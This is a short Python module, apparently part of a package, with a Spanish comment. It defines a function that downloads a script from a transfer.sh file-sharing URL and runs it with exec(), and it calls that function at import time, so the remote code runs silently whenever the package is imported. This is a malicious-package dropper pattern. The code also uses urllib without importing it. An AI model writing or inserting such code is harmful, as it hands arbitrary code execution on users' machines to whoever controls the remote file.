import os

def download_and_execute():
    url = 'https://transfer.sh/get/wDK3Q8WOA9/start.py'
    response = urllib.request.urlopen(url)
    code = response.read()
    exec(code)

# Esta parte asegura que la función se ejecute al importar el paquete
download_and_execute()